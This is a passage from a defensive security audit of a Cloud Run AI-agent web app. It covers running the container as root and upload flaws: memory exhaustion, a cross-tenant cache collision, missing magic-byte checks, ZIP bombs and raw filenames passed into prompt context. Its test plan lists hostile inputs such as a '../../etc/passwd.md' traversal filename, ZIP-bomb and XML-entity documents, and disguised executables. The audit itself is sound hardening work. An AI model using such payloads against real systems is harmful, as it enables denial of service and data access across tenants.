- **Container Breakout / Post-Exploitation Surface:** Running the web server, document parsers (`pypdf`, `python-docx`, `cryptography`), and `gcloud` CLI subprocesses as `UID 0` (`root`) with a root-owned writable `/app` tree allows any file-write or parser bug to overwrite `main.py`/`pqc_agent/*.py`, modify CA trust bundles, or tamper with system binaries inside the container instance.

### 3. Existing Security Controls
- Explicit file allowlist in `Dockerfile` (`COPY requirements.txt`, `alembic.ini`, `migrations`, `pqc_agent`, `tools`, two migration scripts, `main.py` — no `COPY . .`).
- `PYTHONDONTWRITEBYTECODE=1` set (`Dockerfile:L26`), preventing Python from needing write permissions in `/app/pqc_agent/__pycache__` at runtime.

### 4. Confirmed Vulnerabilities
1. **[MEDIUM-HIGH — `P3-04-V1`] Container Executes as `root` (`UID 0`):**
   - Both the Cloud Run HTTP service (`uvicorn main:app`) and the Cloud Run Alembic migration job (`python scripts/run_db_migrations.py`) run as `UID 0`.
2. **[MEDIUM — `P3-04-V2`] Application Source Tree Not Explicitly Locked Read-Only to Runtime User:**
   - Without separating `root:root` ownership (`0555` dirs / `0444` `.py` files / `0555` CLI scripts) from a dedicated unprivileged runtime user (`UID 10001`), runtime processes share ownership of `/app` if `chown -R` is naively applied to `/app`.

### 5. Missing Controls
- Dedicated unprivileged system group and user (e.g., `groupadd -g 10001 pqcapp && useradd -u 10001 -g 10001 -m -d /home/pqcapp -s /usr/sbin/nologin pqcapp`).
- Immutable ownership on `/app` (`chown -R root:root /app`, directories `0755`, Python/config files `0644`, migration scripts `0755`) so `pqcapp` (`UID 10001`) has read/execute access **only** and **cannot** modify `/app` code!
- Dedicated writable directories for `pqcapp` **only** where strictly required:
  - `/tmp/pqc-exports` (`ENV PQC_EXPORT_DIR=/tmp/pqc-exports`, or `/app/exports` chowned `10001:10001` mode `0700`) for `report_exporter.py`.
  - `/tmp/gcloud-config` (`ENV CLOUDSDK_CONFIG=/tmp/gcloud-config`) and `/home/pqcapp` (`0700`) so `gcloud` CLI subprocesses never fail on read-only root/home filesystems.
- Explicit `USER 10001:10001` directive before `EXPOSE` / `CMD`.

### 6. False-Positive Risks
- **Breaking `gcloud` CLI under non-root:** `gcloud` writes configuration state and logs under `$CLOUDSDK_CONFIG` (defaulting to `$HOME/.config/gcloud`). If `USER 10001` has `HOME=/nonexistent` or an unwritable home directory, every `execute_gcloud_command` call fails with `PermissionError: [Errno 13] Permission denied: '/.config'`. Setting `ENV HOME=/home/pqcapp CLOUDSDK_CONFIG=/tmp/gcloud-config` (created or lazily ensured in `gcloud_bridge.py` with `0700`) eliminates this failure mode completely.
- **Breaking Cloud SQL Unix Socket access (`/cloudsql/<INSTANCE_CONNECTION_NAME>`):** On Cloud Run Gen1/Gen2, `/cloudsql/*` Unix sockets are mounted with world-accessible socket permissions (`0777` on socket node) specifically to support non-root containers; verify `UID 10001` retains read/write access during staging rollout.
- **Breaking `scripts/run_db_migrations.py` in Cloud Run Jobs:** Because `/app` files are `0644` and `/app/scripts/run_db_migrations.py` is `0755` (`root:root`), `UID 10001` can execute `python scripts/run_db_migrations.py --require-postgres` without needing write access to `/app`.

### 7. Recommended Implementation Approach
1. Update `Dockerfile` to create `pqcapp` (`10001:10001`), keep `/app` owned by `root:root` (read/execute only for `10001`), set `PQC_EXPORT_DIR=/tmp/pqc-exports` and `CLOUDSDK_CONFIG=/tmp/gcloud-config`, pre-create `/tmp/pqc-exports` and `/tmp/gcloud-config` owned by `10001:10001` (`0700`), and set `USER 10001:10001`.
2. In `tools/gcloud_bridge.py`, set `env.setdefault("CLOUDSDK_CONFIG", os.path.join(tempfile.gettempdir(), f"pqc-gcloud-{os.getuid()}"))` and `os.makedirs(..., mode=0o700, exist_ok=True)` so `gcloud` works even on read-only root filesystems where `/tmp` is mounted as an empty `tmpfs` at container start!
3. Similarly, in `tools/report_exporter.py`, if `out_dir.mkdir()` encounters `PermissionError` on `./exports`, fail cleanly or default `PQC_EXPORT_DIR` to `/tmp/pqc-exports` in production.

### 8. Required Regression and Adversarial Tests
- Static & staged `Dockerfile` verification: `USER 10001:10001` present after `COPY`/`RUN`, `/app` owned by `root:root` (not `chown -R pqcapp /app`), `/app/scripts/run_db_migrations.py` mode `0755`, `PQC_EXPORT_DIR` and `CLOUDSDK_CONFIG` point to writable tmp paths.
- Simulated read-only `/app` test: verify `main:app` startup, `run_db_migrations.py --help`, `save_assessment_report()`, and `execute_gcloud_command()` succeed when `/app` is read-only (`0555`) and only `/tmp` is writable!
- Live Docker container build & `id -u` == `10001` test (gated on `shutil.which("docker")`, preserved `BLOCKED` where Docker is absent).

### 9. Dependencies and Operational Considerations
- Cloud Run mounts `/tmp` as an in-memory `tmpfs` volume per instance; ensure `report_exporter.py` unlinks temporary `/tmp/pqc-exports/*` files after uploading to GCS (or bounds `/tmp/pqc-exports` retention) so `/tmp` memory is not leaked over long-lived instances!

### 10. Severity and Priority
- **Severity:** **MEDIUM-HIGH**
- **Priority:** **P1**

---

## Area 5 (`P3-05`) — Multimodal Upload Size Limits, MIME Validation, and Magic-Byte Validation

### 1. Current Implementation and Exact File References
- [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L1385-L1406): `_guess_gemini_mime_type(filename, declared_mime)` maps extension/declared header to MIME type, defaulting unknown files to `("text/plain", False)`.
- [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3282-L3342): `/api/chat` reads `uploaded_files` via unbounded `await up_file.read()`, saves raw bytes to `artifact_service`, registers extracted text in `_UPLOADED_ARTIFACT_CACHE`, and appends raw/text bytes to `new_message`.
- [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L178-L208): `ResilientGcsArtifactService.save_artifact()` forwards unsanitized `filename` to `super().save_artifact()` (`GcsArtifactService`).
- [tools/calibration_engine.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/calibration_engine.py#L219-L304): `extract_text_from_uploaded_bytes()` runs `pypdf.PdfReader`, `docx.Document`, `cryptography.x509.load_pem_x509_certificate`, or `utf-8`/`latin-1` decode, and stores results in global `_UPLOADED_ARTIFACT_CACHE[f"{session_id}:{filename}"]`.

### 2. Attack Surface and Trust Boundaries
- **Direct Untrusted Binary Input:** Any authenticated user can `POST /api/chat` with `multipart/form-data` `files` containing arbitrary filenames, spoofed `Content-Type` headers, arbitrarily large streams, polyglot files, ZIP bombs (`.docx`), or deeply nested PDFs.
- **Downstream Sinks:** In-process RAM, `pypdf` / `python-docx` / `cryptography` parsers, Google Cloud Storage (`GcsArtifactService` object keys), PostgreSQL `pqc_session_metadata.attachments_json`, and Vertex AI Gemini multimodal message parts.

### 3. Existing Security Controls
- Authentication + CSRF/Origin check via `activate_request_tenant_user(request)` before `/api/chat` processes files.
- `html.escape` / `escapeHtml` in `portal_ui.py` when rendering attachment pill names in the browser UI.

### 4. Confirmed Vulnerabilities
1. **[HIGH — `P3-05-V1`] Unbounded File Count & Unbounded `await up_file.read()` Memory Exhaustion (OOM DoS):**
   - [workspace_server.py:L3307-L3309](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3307-L3309) accepts an unlimited number of files and reads each file completely into memory (`await up_file.read()`) without chunked byte-counting. A single request with a 500 MB upload (or 50 x 20 MB uploads) spikes memory multiple times over (`raw_bytes` + `Part.from_bytes` + GCS buffer + `_UPLOADED_ARTIFACT_CACHE`) and crashes the Cloud Run instance.
2. **[HIGH — `P3-05-V2`] Cross-Tenant `_UPLOADED_ARTIFACT_CACHE` Collision & Unbounded Memory Growth:**
   - [tools/calibration_engine.py:L301-L302](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/calibration_engine.py#L301-L302) keys `_UPLOADED_ARTIFACT_CACHE` by `f"{session_id}:{filename}"` and `f"{session_id}:latest"` **without `user_id`**, while `POST /api/sessions` ([workspace_server.py:L3109](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3109)) allows callers to choose a custom `session_id`! Two tenants choosing the same `session_id` overwrite/read each other's cached uploaded text in `read_uploaded_artifact()`, and `_UPLOADED_ARTIFACT_CACHE` never evicts old entries!
3. **[HIGH — `P3-05-V3`] Missing Allowlist, MIME-vs-Extension Consistency, and Magic-Byte Validation:**
   - `_guess_gemini_mime_type()` trusts client `filename` / `Content-Type` without inspecting file headers, and falls back to `("text/plain", False)` + `latin-1` decoding ([calibration_engine.py:L283](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/calibration_engine.py#L283)) for arbitrary executables (`.exe`, `.elf`, `.dll`, `.zip`, `.tar.gz`).
4. **[HIGH — `P3-05-V4`] `.docx` ZIP-Bomb / XML Expansion and `.pdf` Page/Text Explosion DoS:**
   - `docx.Document(io.BytesIO(raw_bytes))` ([calibration_engine.py:L238](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/calibration_engine.py#L238)) opens untrusted ZIP archives without checking `zipfile.ZipInfo.file_size` totals, compression ratios, entry counts, or DTD/entity payloads in XML members.
   - `PdfReader(io.BytesIO(raw_bytes))` ([calibration_engine.py:L227-L228](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/calibration_engine.py#L227-L228)) extracts text across all pages with no page cap or cumulative text-length cap, silently swallowing all exceptions (`except Exception: pass`) and falling through to raw `latin-1` decode of compressed PDF streams!
5. **[MEDIUM — `P3-05-V5`] Unsanitized Upload Filename Passed to GCS & Prompt Context:**
   - `fname = up_file.filename` is passed directly into `artifact_service.save_artifact(..., filename=fname)` (allowing `../` segments or `/` path injection into GCS object keys) and interpolated raw into `augmented_text` (`[UPLOADED_ARTIFACTS_CONTEXT]: The user attached: {names}`).

### 5. Missing Controls
- Strict upload limits returning HTTP `413` / `400` / `415`:
  - Max files per turn: `PQC_MAX_UPLOAD_FILES_PER_TURN` (default `5`).
  - Max bytes per file (stream-read in `64 KiB` chunks, aborting at `max_bytes + 1` before buffering more): `PQC_MAX_UPLOAD_FILE_BYTES` (default `10 MiB`).
  - Max total upload bytes per turn: `PQC_MAX_UPLOAD_TOTAL_BYTES` (default `25 MiB`).
  -Reject `0`-byte empty files (`400`).
- Strict filename sanitizer (`sanitize_upload_filename`): strip directory components, reject traversal/null/control chars, normalize to `[A-Za-z0-9._-]`, cap length (`<= 128` chars), preserve validated extension.
- Strict extension + MIME + magic-byte validator (`validate_and_sniff_upload`):
  - **PDF (`.pdf`):** starts with `%PDF-` (within leading bytes, no HTML/JS polyglot prefix), max page count (`<= 200`), bounded extracted text (`<= 256 KiB`), never fall back to `latin-1` binary dump on corrupt PDF!
  - **DOCX (`.docx`):** starts with `PK\x03\x04`; inspect `zipfile.ZipFile` entries BEFORE calling `python-docx` — enforce max entries (`<= 500`), max total uncompressed bytes (`<= 32 MiB`), max compression ratio (`<= 100:1`), no `..` member paths, required `[Content_Types].xml` + `word/document.xml`, and reject XML `<!DOCTYPE` / `<!ENTITY` declarations across all `.xml`/`.rels` members!
  - **PNG (`.png`):** exact `\x89PNG\r\n\x1a\n` magic header + valid `IHDR` dimensions cap.
  - **JPEG (`.jpg`, `.jpeg`):** exact `\xff\xd8\xff` magic header.
  - **X.509 Certificates (`.pem`, `.crt`, `.cer`):** ASCII/UTF-8 PEM `-----BEGIN CERTIFICATE-----` (or valid DER X.509 for `.cer`/`.crt`), **explicitly rejecting private keys (`-----BEGIN PRIVATE KEY-----`, `-----BEGIN RSA PRIVATE KEY-----`, `-----BEGIN EC PRIVATE KEY-----`)** so users cannot accidentally upload live private key material into session storage or LLM prompts!
  - **Structured Text (`.txt`, `.md`, `.markdown`, `.csv`, `.json`, `.yaml`, `.yml`):** strict UTF-8 decode (no `latin-1` binary fallback!), zero NUL `\x00` bytes, JSON syntax check for `.json` (optional/non-destructive), reject binary magic headers (`MZ`, `\x7fELF`, `PK\x03\x04`, `%PDF-`) masquerading as `.txt`/`.csv`!
- Partition `_UPLOADED_ARTIFACT_CACHE` by `(user_id, session_id, sanitized_filename)` with bounded LRU capacity (e.g. max `128` entries / `32 MiB` total text + TTL `3600s`).

### 6. False-Positive Risks
- **UTF-8 BOM & CRLF in Enterprise CSV/JSON/Markdown Exports:** Windows/Excel CSV and Markdown files frequently begin with a UTF-8 BOM (`\xef\xbb\xbf`) and use `\r\n` line endings or tabs `\t`. Text validation MUST permit UTF-8 BOM (`utf-8-sig`) and `\r`, `\n`, `\t` whitespace while rejecting NUL `\x00` and non-text binary control bytes.
- **DER-encoded `.cer`/`.crt` Certificates:** Enterprise PKI teams sometimes upload DER-encoded X.509 certificates (`0x30 0x82 ...` ASN.1 SEQUENCE) rather than PEM. Supporting `x509.load_der_x509_certificate` alongside `load_pem_x509_certificate` for `.cer`/`.crt` prevents false rejections while still extracting only public X.509 metadata (and rejecting PKCS#8/PKCS#12 private keys!).
- **Accidental `.key` Support in Current `_guess_gemini_mime_type` (`L1400`):** Currently `.key` is listed at `workspace_server.py:L1400`! Rejecting `.key` / `.pfx` / `.p12` private key uploads with a clear security message (`400: Private key uploads are prohibited; upload public certificates or inventory exports only`) is a major security improvement, provided no existing test uploads a `.key` file (verified: `tests/` only uploads `.md`, `.csv`, `.pdf`, `.pem` public certs — zero `.key` uploads in tests!).

### 7. Recommended Implementation Approach
1. Create `pqc_agent/upload_validator.py` implementing chunked stream reading (`read_bounded_upload`), `sanitize_upload_filename`, magic-byte + structural validation (`validate_uploaded_file`), private-key blocklist, ZIP-bomb guard for `.docx`, and bounded PDF extraction.
2. Enforce validation in `/api/chat` BEFORE `artifact_service.save_artifact()` or `register_uploaded_artifact_for_analysis()` is ever called (returning `413` on size overflow, `415` on unsupported/mismatched MIME or magic bytes, `400` on empty/corrupt/private-key/zip-bomb payloads).
3. Scope `_UPLOADED_ARTIFACT_CACHE` in `tools/calibration_engine.py` by `f"{normalize_user_id(user_id)}:{session_id}:{sanitized_filename}"` with bounded `OrderedDict` LRU + byte budget + TTL.

### 8. Required Regression and Adversarial Tests
- Oversized single file (`> PQC_MAX_UPLOAD_FILE_BYTES`), oversized aggregate multi-file upload (`> PQC_MAX_UPLOAD_TOTAL_BYTES`), too many files (`> PQC_MAX_UPLOAD_FILES_PER_TURN`), and `0`-byte upload -> rejected cleanly (`413` / `400`) without writing to GCS or DB.
- Spoofed extension/MIME attacks: ELF/EXE renamed to `report.pdf` or `notes.txt`, PNG bytes declared as `application/pdf`, arbitrary `.zip` (without `word/document.xml`) renamed to `policy.docx`, `.docx` ZIP bomb (`1000:1` ratio or `> 32 MiB` uncompressed), `.docx` containing XML `<!ENTITY`, corrupt PDF stream, and PEM private key (`-----BEGIN PRIVATE KEY-----`) -> all rejected (`400`/`415`) with zero `latin-1` fallback!
- Cross-tenant `_UPLOADED_ARTIFACT_CACHE` isolation test: User A and User B with identical client-supplied `session_id="shared-sess"` cannot read each other's cached artifacts via `read_uploaded_artifact()`.
- Path-traversal filename (`../../etc/passwd.md`, `folder/sub/notes.md`) -> sanitized cleanly before GCS/session storage.
- Positive regression tests: valid `.md` (with UTF-8 BOM), `.csv`, `.json`, `.pdf`, `.docx`, `.png`, `.jpg`, and public X.509 `.pem`/`.crt` continue to succeed end-to-end through `/api/chat` and `read_uploaded_artifact`.

### 9. Dependencies and Operational Considerations
- Zero new third-party dependencies required (`zipfile`, `io`, `unicodedata`, `collections.OrderedDict` in Python stdlib, plus existing `pypdf`, `python-docx`, `cryptography`).
- Expose configurable limits via environment variables (`PQC_MAX_UPLOAD_FILES_PER_TURN`, `PQC_MAX_UPLOAD_FILE_BYTES`, `PQC_MAX_UPLOAD_TOTAL_BYTES`) with safe defaults.

### 10. Severity and Priority
- **Severity:** **HIGH**
- **Priority:** **P0**

---

## Out-of-Scope / Deferred Future Architecture Decisions

Per Stage 5 scope boundaries, the following items were observed during inspection and intentionally **excluded** from Phase 3 runtime resilience scope to avoid architectural creep:
1. **Model Registry Last-Known-Good (LKG) Catalog & Negative-Cache TTL Strategy:** Currently `ModelRegistry` (`pqc_agent/model_registry.py:L118`) caches failed startup probes for `21600s` in-memory per instance. Persisting LKG model availability in PostgreSQL or redesigning dynamic model discovery should be evaluated separately from Phase 3 timeout/retry/circuit-breaker controls.
2. **Legacy Functional Lab Scope Fallback (`DEFAULT_FUNCTIONAL_LAB_FALLBACK_SCOPES` in `tools/gcp_inventory.py:L641-L645` and org-to-folder fallback in `tools/gcloud_bridge.py:L611-L647`):** Should be reviewed in a future multi-tenant hardening phase so non-demo customer deployments disable Argolis lab fallback scopes in production.
